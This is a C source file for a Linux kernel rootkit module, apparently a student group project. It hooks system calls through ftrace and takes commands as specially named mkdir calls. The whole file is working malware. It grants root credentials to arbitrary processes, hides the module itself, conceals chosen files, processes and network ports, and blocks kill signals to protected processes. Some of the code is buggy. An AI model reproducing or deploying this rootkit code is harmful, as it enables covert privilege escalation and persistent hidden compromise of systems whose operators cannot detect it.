#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/udp.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("Group 10");
MODULE_DESCRIPTION("Baby Kernel Rootkit");
MODULE_VERSION("1.0.0");

#include "hook.h"
#define INLIST 1
#define NOTINLIST 0
#define TCP 0
#define UDP 1
#define IPV4 4
#define IPV6 6

void find_task(unsigned long task_pid, struct task_struct *task)
{
    struct pid *proc_pid = find_vpid(task_pid);

    if(!proc_pid) 
    {
        printk("rootkit: Failed to get pid.\n");
        return;
    }
    
    task = pid_task(proc_pid, PIDTYPE_PID);

    if (task == NULL) 
    {
      printk("rootkit: Failed to get this task info.\n");
      return;
    }
}

void set_root(unsigned long task_pid)
{
    struct task_struct *task = NULL;
    struct cred *root;

    find_task(task_pid, task);

    root = prepare_creds();

    if (root == NULL)
    {
        printk(KERN_INFO "rootkit: Failed to get creds.\n");
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    
    rcu_assign_pointer(task->cred, root);

    printk(KERN_INFO "rootkit: Process #%lu is root now.\n", task_pid);
}

struct hide_file_list {
    struct list_head list;
    unsigned long file_ino;
};

struct hide_process_list {
    struct list_head list;
    unsigned long pid_proc_ino;
};

struct protect_process_list {
    struct list_head list;
    pid_t pid;
};

struct hide_port_list {
    struct list_head list;
    int protocol_type;
    int ip_type;
    unsigned long port;
};

struct hide_file_list *hide_files_head;
struct hide_process_list *hide_processes_head;
struct protect_process_list *protect_processes_head;
struct hide_port_list *hide_ports_head;

void init_links(void)
{
    hide_files_head = kmalloc(GFP_KERNEL, sizeof(struct hide_file_list));
    hide_files_head->file_ino = 0;
    INIT_LIST_HEAD(&hide_files_head->list);
    
    hide_processes_head = kmalloc(GFP_KERNEL, sizeof(struct hide_process_list));
    hide_processes_head->pid_proc_ino = 0;
    INIT_LIST_HEAD(&hide_processes_head->list);

    protect_processes_head = kmalloc(GFP_KERNEL, sizeof(struct protect_process_list));
    protect_processes_head->pid = 0;
    INIT_LIST_HEAD(&protect_processes_head->list);

    hide_ports_head = kmalloc(GFP_KERNEL, sizeof(struct hide_port_list));
    hide_ports_head->protocol_type = 0;
    hide_ports_head->ip_type = 0;
    hide_ports_head->port = 0;
    INIT_LIST_HEAD(&hide_ports_head->list);
}

void add_hide_file(const char * filename)
{
    struct file* target = NULL;
    target = filp_open(filename, O_PATH, 0);
    if(!IS_ERR(target)){
        struct hide_file_list *temp_file = kmalloc(sizeof(struct hide_file_list), GFP_KERNEL);
        temp_file->file_ino = target->f_inode->i_ino;
        INIT_LIST_HEAD(&temp_file->list);
        list_add_tail(&temp_file->list, &hide_files_head->list);

        printk(KERN_INFO "rootkit: Hide file added: %s %lu.\n", filename, target->f_inode->i_ino);
    } else {
        printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
    }
}

void del_hide_file(const char * filename)
{
    struct file* target = NULL;
    struct hide_file_list *cursor, *temp;
    target = filp_open(filename, O_PATH, 0);
    if(!IS_ERR(target)){
        list_for_each_entry_safe(cursor, temp, &hide_files_head->list, list) {
            if(target->f_inode->i_ino == cursor->file_ino)
            {
                list_del(&cursor->list);
                kfree(cursor);
            }
        }

        printk(KERN_INFO "rootkit: Hide file deleted: %s %lu.\n", filename, target->f_inode->i_ino);
    } else {
        printk(KERN_INFO "rootkit: No such file: %s.\n", filename);
    }
}

int check_hide_file(unsigned long file_ino)
{
    struct hide_file_list *temp;
    list_for_each_entry(temp, &hide_files_head->list, list) {
        if(file_ino == temp->file_ino)
        {
            return INLIST;
        }
    }

    return NOTINLIST;
}


void add_hide_process(const char * pid)
{
    char *process_proc = kmalloc(sizeof(char) * (strlen(pid) + 10), GFP_KERNEL);
    struct file* target = NULL;
    strcpy(process_proc, "/proc/");
    strcat(process_proc, pid);
    target = filp_open(process_proc, O_PATH, 0);
    if(!IS_ERR(target)){
        struct hide_process_list *temp_process = kmalloc(sizeof(struct hide_process_list), GFP_KERNEL);
        temp_process->pid_proc_ino = target->f_inode->i_ino;
        INIT_LIST_HEAD(&temp_process->list);
        list_add_tail(&temp_process->list, &hide_processes_head->list);

        printk(KERN_INFO "rootkit: Hide process added: %s.\n", pid);
    } else {
        printk(KERN_INFO "rootkit: No such process: %s.\n", pid);
    }
}


void del_hide_process(const char * pid)
{
    char *process_proc = kmalloc(sizeof(char) * (strlen(pid) + 10), GFP_KERNEL);
    struct hide_process_list *cursor, *temp;
    struct file* target = NULL;
    strcpy(process_proc, "/proc/");
    strcat(process_proc, pid);
    printk(KERN_INFO "rootkit: deleting %s\n", process_proc);
    target = filp_open(process_proc, O_PATH, 0);
    if(!IS_ERR(target)){
        list_for_each_entry_safe(cursor, temp, &hide_processes_head->list, list) {
            if(target->f_inode->i_ino == cursor->pid_proc_ino)
            {
                list_del(&cursor->list);
                kfree(cursor);
            }
        }

        printk(KERN_INFO "rootkit: Hide process deleted: %s.\n", pid);
    } else {
        printk(KERN_INFO "rootkit: No such process: %s.\n", pid);
    }
}

int check_hide_process(unsigned long process_proc_ino)
{
    struct hide_process_list *temp;
    list_for_each_entry(temp, &hide_processes_head->list, list) {
        if(process_proc_ino == temp->pid_proc_ino)
        {
            return INLIST;
        }
    }

    return NOTINLIST;
}

void add_protect_process(pid_t pid)
{
    struct protect_process_list *temp_process = kmalloc(sizeof(struct protect_process_list), GFP_KERNEL);
    temp_process->pid = pid;
    INIT_LIST_HEAD(&temp_process->list);
    list_add_tail(&temp_process->list, &protect_processes_head->list);

    printk(KERN_INFO "rootkit: Protect process added: %d.\n", pid);
}


void del_protect_process(pid_t pid)
{
    struct protect_process_list *cursor, *temp;

    list_for_each_entry_safe(cursor, temp, &protect_processes_head->list, list) {
        if(pid == cursor->pid)
        {
            list_del(&cursor->list);
            kfree(cursor);
        }
    }

    printk(KERN_INFO "rootkit: Protect process deleted: %d.\n", pid);

}

int check_protect_process(pid_t pid)
{
    struct protect_process_list *temp;
    list_for_each_entry(temp, &protect_processes_head->list, list) {
        if(pid == temp->pid)
        {
            return INLIST;
        }
    }

    return NOTINLIST;
}

void add_hide_port(int protocol_type, int ip_type, unsigned long port)
{
    struct hide_port_list *temp_port = kmalloc(sizeof(struct hide_file_list), GFP_KERNEL);
    temp_port->protocol_type = protocol_type;
    temp_port->ip_type = ip_type;
    temp_port->port = port;
    INIT_LIST_HEAD(&temp_port->list);
    list_add_tail(&temp_port->list, &hide_ports_head->list);

    printk(KERN_INFO "rootkit: Hide port added: %s %s %lu.\n", (protocol_type == TCP) ? "TCP" : "UDP", (ip_type == IPV4) ? "IPV4" : "IPV6", port);
}

void del_hide_port(int protocol_type, int ip_type, unsigned long port)
{
    struct hide_port_list *cursor, *temp;

    list_for_each_entry_safe(cursor, temp, &hide_ports_head->list, list) {
        if(protocol_type == cursor->protocol_type && ip_type == cursor->ip_type && port == cursor->port)
        {
            list_del(&cursor->list);
            kfree(cursor);
        }
    }

    printk(KERN_INFO "rootkit: Hide port deleted: %s %s %lu.\n", (protocol_type == TCP) ? "TCP" : "UDP", (ip_type == IPV4) ? "IPV4" : "IPV6", port);
}

int check_hide_port(int protocol_type, int ip_type, unsigned long port)
{
    struct hide_port_list *temp;
    list_for_each_entry(temp, &hide_ports_head->list, list) {
        if(protocol_type == temp->protocol_type && ip_type == temp->ip_type && port == temp->port)
        {
            return INLIST;
        }
    }

    return NOTINLIST;
}

static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);

static struct list_head *prev_module;
typedef unsigned char *byte_pointer;

void debug_show_bytes(byte_pointer start, int len) {
    printk(KERN_INFO "rootkit: Debug start: ");

    for (int i = 0; i < len; i++)
    {
        printk(KERN_CONT " %c", start[i]);
    }
    
    printk(KERN_CONT "\n");
}

int hide_status = 0;

void hide_module(void)
{
    if(!hide_status)
    {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hide_status = 1;
        printk(KERN_INFO "rootkit: Hide self success.\n");
    }
}

void show_module(void)
{
    if(hide_status)
    {
        list_add(&THIS_MODULE->list, prev_module);
        hide_status = 0;
        printk(KERN_INFO "rootkit: Show self success.\n");
    }
}

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error <= 0)
        return 0;
    
    if(strncmp(dir_name, "set-root@", 9) == 0)
    {
        set_root((unsigned long)simple_strtol(&dir_name[9], (char **)(dir_name), 10));
    } 
    else if(strncmp(dir_name, "hide-module@", 12) == 0) 
    {
        hide_module();
    } 
    else if(strncmp(dir_name, "show-module@", 12) == 0) 
    {
        show_module();
    } 
    else if(strncmp(dir_name, "hide-file@", 10) == 0) 
    {
        add_hide_file(&dir_name[10]);
    }
    else if(strncmp(dir_name, "show-file@", 10) == 0) 
    {
        del_hide_file(&dir_name[10]);
    } 
    else if(strncmp(dir_name, "hide-process@", 13) == 0) 
    {
        add_hide_process(&dir_name[13]);
    }
    else if(strncmp(dir_name, "show-process@", 13) == 0) 
    {
        del_hide_process(&dir_name[13]);
    } 
    else if(strncmp(dir_name, "protect-process@", 16) == 0) 
    {
        add_protect_process((pid_t)simple_strtol(&dir_name[16], (char **)(dir_name), 10));
    }
    else if(strncmp(dir_name, "unprotect-process@", 18) == 0) 
    {
        del_protect_process((pid_t)simple_strtol(&dir_name[18], (char **)(dir_name), 10));
    } 
    else if(strncmp(dir_name, "hide-port@", 10) == 0) 
    {
        add_hide_port((strncmp(&dir_name[10], "tcp", 3) == 0) ? TCP : UDP, (dir_name[13] == '4') ? IPV4 : IPV6, (unsigned long)simple_strtol(&dir_name[15], (char **)(dir_name), 10));
    }
    else if(strncmp(dir_name, "show-port@", 10) == 0) 
    {
        del_hide_port((strncmp(&dir_name[10], "tcp", 3) == 0) ? TCP : UDP, (dir_name[13] == '4') ? IPV4 : IPV6, (unsigned long)simple_strtol(&dir_name[15], (char **)(dir_name), 10));
    } 
    else 
    {
        return orig_mkdir(regs);
    }

    return 0;
}

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;
    long error;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if(ret <= 0)
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
    {
        printk(KERN_INFO "rootkit: Copy failed.\n");
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if (check_hide_file(current_dir->d_ino) || check_hide_process(current_dir->d_ino))
        {
            if(current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        printk(KERN_INFO "rootkit: Copy failed.\n");

    kfree(dirent_ker);
    return ret;
}

asmlinkage int hook_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;

    if (check_protect_process(pid))
        return 0;

    return orig_kill(regs);
}

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != 0x1 && check_hide_port(TCP, IPV4, sk->sk_num))
        return 0;

    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != 0x1 && check_hide_port(TCP, IPV6, sk->sk_num))
        return 0;

    return orig_tcp6_seq_show(seq, v);
}

static asmlinkage long hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != 0x1 && check_hide_port(UDP, IPV4, sk->sk_num))
        return 0;

    return orig_udp4_seq_show(seq, v);
}

static asmlinkage long hook_udp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != 0x1 && check_hide_port(UDP, IPV6, sk->sk_num))
        return 0;

    return orig_udp6_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hook_udp6_seq_show, &orig_udp6_seq_show),
};


static int __init rootkit_init(void)
{
    int err;
    init_links();

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded. <============================>\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);